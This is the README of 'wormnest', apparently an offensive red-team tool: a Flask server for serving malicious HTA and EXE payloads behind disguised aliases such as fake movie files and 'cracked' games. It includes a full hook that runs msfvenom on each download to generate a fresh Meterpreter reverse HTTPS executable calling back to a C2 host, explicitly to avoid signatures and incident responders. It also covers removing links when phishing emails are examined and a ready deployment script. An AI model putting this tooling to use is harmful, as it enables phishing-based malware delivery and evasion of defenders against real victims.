# wormnest
*A place where worms live and reproduce, but you can't prove it...*

A **Python3** Flask / SQL-Alchemy Web Server for *URL Minification* and *Manipulated File Serving*.

Heavily inspired by [@bluscreenofjeff](https://github.com/bluscreenofjeff/) and *Cobalt Strike's Web Server* ([References](https://github.com/operatorequals/wormnest/wiki/References)), a Web Server that does it all!

## Showcase:
### Access the interface with:
```
http://localhost:8000/manage/
```
It's pure HTML, no CSS nonsense, no JS engine has been harmed. No AJAX, no cookies, no hassles. **Just working HTML**.

### Usage:
If we need to:
* serve an `HTA` file available at `path/to/some/veryevil.hta`
* through some **custom link**
* with some **filename that is not suspicious**
* that will **expire after 5 downloads**

we can issue the following GET request to `wormnest`:

### Add URL Aliases
```php
# Splitting the URL parameters for readability
http://localhost:8000/manage/add?
path=path/to/some/veryevil.hta&
alias=fight_club_xvid_1999.avi&
filename=fight_club_xvid_1999.hta&
clicks=5
# Unsplit:
http://localhost:8000/manage/add?path=path/to/some/veryevil.hta&alias=fight_club_xvid_1999.avi&filename=fight_club_xvid_1999.hta&clicks=5
```
This will create an *alias URL* for the `path/to/some/veryevil.hta`, making the serving as easy as:
```
http://payload-server:8000/fight_club_xvid_1999.avi
```
This will serve a file named "*fight_club_xvid_1999*.**hta**", and will only last *5 clicks*!

#### Play it again, Johny Guitar
Let's serve the **same file**, without any expiration, with **a random alias** ([TinyURL](https://tinyurl.com) style), and a "*SergioLeoneCollection_TheGoodTheBadAndTheUgly(1966)_subs-Autoplay*.**hta**" filename.
```
http://localhost:8000/manage/add?path=path/to/some/veryevil.hta&filename=SergioLeoneCollection_TheGoodTheBadAndTheUgly(1966)_subs-Autoplay.hta
```
This will produce an 8 (by default) character, random ASCII string alias, like `/J3jcrZqd` that will prompt for a `SergioLeoneCollection_TheGoodTheBadAndTheUgly(1966)_subs-Autoplay.hta` download, and it will contain (of course) the `veryevil.hta` contents.

### Delete URL Aliases
If, for some reason, you need to make the `/fight_club_xvid_1999.avi` unavailable (some phishing email is getting examined?), then a:
```php
http://localhost:8000/manage/del?alias=fight_club_xvid_1999.avi
```
will do! That means that either a `404 Error` or a `302 Redirect` will occur on access to the URL:
```
http://payload-server:8000/fight_club_xvid_1999.avi
```


## Hooking the GET like never before *and the `unchecked` flag*

The above work well for static files. But when Penetration Testing, there is the need to serve payloads *that are different from time to time*, just to be sure you *don't generate any signatures* during the assessment.
Well, again, as [@bluscreenofjeff](https://github.com/bluscreenofjeff/) taught in [this blog post](https://bluescreenofjeff.com/2014-04-17-Fresh-Veil-Automatically-Generating-Payloads/), you can generate payloads every some minutes, just in case to be sure that the Incident Response guys will not get what you first served.

But what about, generate a new payload in each click?
Meet hooks. Meet the [hooker](https://github.com/satori-ng/hooker).

As of `0.3.0`, the directory `hooks/` will contain python *hooks*, that will run when certain GET requests are issued.
Hooks can be imported using the `HOOK_SCRIPTS` environment variable, and have to be separated by colon (`:`), Like ` HOOK_SCRIPTS=hook1.py:hook2.py`.

### Hooks:
#### `hooks/os_dependent_serve.py`
This hook reads the request's *User-Agent* and serves a different alias depending on strings found in it.
Supports both *HTTP Redirect* and *Transparent Proxy* mode!

*Needs Manual Configuration before launching*

#### `hooks/random_from_directory.py`
This hook serves a random file from within a set directory.

#### `hooks/autogen_msf.py`
Proof-of-Concept per-request payload generator. It uses `msfvenom` by breaking to a `system()` shell.
Could work with [EVER](https://github.com/Veil-Framework/Veil-Evasion) [YTH](https://github.com/trustedsec/unicorn) [ING](https://www.shellterproject.com/) (that has non-interactive interface).
Beware that *(time-to-generate) > (TCP-timeout) = True* for some tools...

*Needs Manual Configuration before launching*

#### `hooks/req_log_hook.py`
This hook logs a `HTTP-Method User-Agent URL` for each request. Mostly a proof of concept for stats and measurements.


### Breaking down the `hooks/autogen_msf.py` hook:
```python
'''
This hook serves a Meterpreter staged Reverse HTTPS
iteration, created with msfvenom for each new visit
of the triggering URL.
'''
import hooker
import subprocess
import tempfile

MSFVENOM = "msfvenom"    # msfvenom path
C2_HOST = "127.0.0.1"    # Returns to localhost: Change this!
C2_PORT = 443

# Staged MetHTTPS
PAYLOAD = "windows/meterpreter/reverse_https"    

# Triggered if the served filename contains the below string:
#   Example: rev_https.msf.exe
trigger_filename = '.msf'

@hooker.hook("pre_file")
def autogen_msf(filename, request):
    if trigger_filename not in filename:
        return None

    extension = '.' + filename.split('.')[-1]
    fd = tempfile.NamedTemporaryFile('rb', suffix=extension)

    command = f"{MSFVENOM} -p {PAYLOAD} LHOST={C2_HOST} LPORT={C2_PORT} -f exe -o {fd.name}"
    print("[!] '{}'".format(command))
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"Failed to execute command: '{command}'")
    return fd
```
Loading it and running is as easy as `HOOK_SCRIPTS=hooks/autogen_msf.py python3 app.py`.
Now, to trigger the hook we need a file with `.msf` in its filename to be aliased. So:
```
http://wormnest:8080/manage/add?path=rev_https.msf.exe&alias=msf
```
But this returns an error, about non-existing `rev_https.msf.exe` file.
That's why `unchecked` exists:
```
http://wormnest:8080/manage/add?path=rev_https.msf.exe&alias=msf&unchecked=true
```
Now `http://wormnest:8080/msf` is accessible, and will return a Meterpreter EXE!
Test it with `wget http://wormnest:8080/msf`!


Meterpreter is a little old fashioned?
You can always code your own hooks...

----


## Install - Setup - Deploy
---
Install with:
```bash
git clone https://github.com/operatorequals/wormnest/   # stick to a git tag for production
cd wormnest
pip install -r requirements
```

Run with:
```bash
$ export [a bunch of Environment Variables] # Skip that for sane defaults (more below)
$
$ python3 app.py
```

### The used Environment Variables and the *Sane Defaults*

Go to the [Project's Wiki Page](https://github.com/operatorequals/wormnest/wiki/Deployment)


### For *Cobalt Strikers*
Generating payloads from the CS client directly to the (remote) *Worm Nest* deployment is as simple as [`sshfs`](https://github.com/libfuse/sshfs) to that served directory (`SRV_DIR`). People tend to forget that `scp` is by far NOT THE ONLY WAY!

A simple:
```bash
mkdir -p ~/cs_payloads
sshfs user@payloadserver:/place/where/wormnest/SRV_DIR/points ~/cs_payloads
```
and then you can drop *artifacts* in `cs_payloads` directory and list them under `http://payloadserver:8000/manage/list`, ready for aliasing and serving!

## A Simple Deployment Scenario

##### wormnest.sh
```bash
#!/bin/bash

# Generate a big and random Management URI
# Bash-Fu taken from https://unix.stackexchange.com/questions/230673/how-to-generate-a-random-string
export MANAGE_URL_DIR="$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '')"
echo "$MANAGE_URL_DIR" > $HOME/wormnest_management.key

export REDIRECT_URL="https://google.com"
export DEFAULT_FILENAME="SpotifyFree_premium_crack" # No file extension here if USE_ORIGINAL_EXTENSION is set!

apt update && apt install -y python3 git # Let's assume Debian

git clone https://github.com/operatorequals/wormnest -b <some_tag> --depth 1 # depth 1 for copying just the tagged commit 
cd wormnest
pip3 install -r requirements.txt
echo '{
  "download_now":{
    "path":"metasploit/generated/meter_pinning_443.exe",
    "filename":"CrazyTaxi_cracked_singlefile_by_Raz0r_team_2006.exe"
  },
}' > basic_routes.json
export DEFAULT_PATHS_FILE="basic_routes.json"

mkdir -p ~/generated_payloads/
export SRV_DIR="$HOME/generated_payloads"

python3 app.py
```
##### wormnest_start.sh
```bash
#!/bin/bash
tmux new -s wormnest -d 'bash wormnest.sh'
```
Having in mind mass-deployment environments (looking at you [Red Baron](https://github.com/Coalfire-Research/Red-Baron)), such scripts come in handy. In the `terraform` case, a `remote-exec` provisioner can replace the need for `wormnest_start.sh`.


## Securing your *Worm Nest*!
There is **no authentication** for the management endpoint of this service. This effectively means that anyone going under the `/manage/` directory will be able to *see, add, delete all* URL aliases, and *list the whole served directory*.

Yet, adding authentication, is (at least at this point) out of scope. That's why the `MANAGE_URL_DIR` exists in the first place. A *passwordish* string here will prevent anyone (not able to guess it) to reach the management endpoint. A password in the URL sucks (I now), but combined with some HTTPS (needed in case of actual use), and with no Intercepting HTTP Proxy between your host and the *Worm Nest* deployment you'll be good enough!

Or even hiding the whole `wormnest` behind an *Apache mod_rewrite proxy* would also work (and add the desired SSL, while redirecting away the `/manage/` attempts).

Have Fun!


